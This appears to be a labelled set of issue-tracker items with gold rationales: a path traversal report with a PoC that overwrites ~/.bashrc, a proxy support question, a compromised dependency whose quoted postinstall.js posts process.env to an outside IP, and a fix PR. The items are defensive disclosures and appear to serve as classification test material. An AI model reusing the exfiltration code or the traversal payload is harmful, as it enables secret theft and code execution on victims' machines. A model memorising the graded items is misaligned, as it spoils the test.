title: Path traversal in .widgetpack import writes files outside the project

text.body:
**Summary**
`widget import <file>.widgetpack` does not sanitise entry names. An archive entry named `../../.bashrc` (or `..\..\AppData\...` on Windows) is written relative to the project folder, so importing a pack someone sends you can overwrite arbitrary files in your home directory.

**Affected**: 3.1.5 and 3.2.0-rc.1 (tested), probably everything since packs were added in 2.8.

**PoC**
```
python3 make_pack.py --entry '../../.bashrc' --content 'echo pwned' -o evil.widgetpack
widget import evil.widgetpack --into ~/widget/projects/test
tail -1 ~/.bashrc   # -> echo pwned
```
Same result when the pack is opened by double click in the desktop app.

**Impact**: code execution on next shell start for anyone who imports a shared pack. Packs are shared on the community forum a lot.

**Suggested fix**: reject entries whose normalised path escapes the target dir, refuse absolute paths and symlinks.

I have not published this anywhere else. Happy to test a patch.

gold.rationale: Report of "path traversal": "../" entries in an imported .widgetpack "overwrite arbitrary files in your home directory"; also labelled "security".

title: Network settings question

text.body:
Hi, we deploy widget to our staff through our software center and configure the proxy via `/etc/widget/policy.toml`:

```toml
[network]
proxy = "http://proxy.corp.internal:3128"
no_proxy = ["*.corp.internal"]
```

Is `policy.toml` still the supported way, or was it replaced by something in the new settings screen? We couldn't find it in the 3.2 changelog. I also tried the `HTTPS_PROXY` env var for one user, no change.

Background: after the 3.2.0 rollout last Monday, nobody in our office (about 300 users) has been able to sync. The app tries to connect directly and times out (`connection timed out after 30s: api.widget.example:443`), and our firewall logs show direct connections, not via the proxy. If there's a new setting name we're happy to push it out today.

title: chromaflux-picker 2.4.1 (theme editor dependency) has a postinstall that uploads env vars

text.body:
The theme editor pulls in `chromaflux-picker` through `ui/package-lock`. While building main locally I noticed outgoing traffic during `make deps`. `ui/vendor/chromaflux-picker/scripts/postinstall.js` in 2.4.1 contains:

```js
const d = Buffer.from(JSON.stringify(process.env)).toString('base64');
require('https').request({host:'203.0.113.77',path:'/i',method:'POST'}).end(d);
```

2.4.0 does not have a postinstall at all. Our lockfile on main has pinned 2.4.1 since the automated dependency bump merged on Tuesday, so every contributor and every CI job that ran `make deps` since then sent its environment, including whatever tokens CI has (signing key? release upload token?).

Suggest: pin back to 2.4.0, rotate all CI secrets, check whether nightly builds since Tuesday are affected.

gold.rationale: A locked dependency's new "postinstall" posts "process.env" to an outside host, a compromised dependency that leaked CI and contributor secrets.

title: import: reject archive entries that escape the target directory

text.body:
Fixes #646

## What
- Normalise every entry path in `widget-import` and reject entries that resolve outside the target directory (`..`, absolute paths, drive letters, UNC paths).
- Skip symlink entries entirely; packs never need them.
- Add tests with crafted archives for Linux and Windows path forms.

## Notes
The check runs before any file is created, so a bad pack fails with `E_PACK_UNSAFE_PATH` and leaves nothing behind.

- [x] Tests added
- [x] Changelog entry (security section)
- [ ] Backport to 3.1.x (separate PR)

gold.rationale: Pull request that "Fixes #646", the .widgetpack path traversal, by rejecting entries that escape the target directory: a security fix.
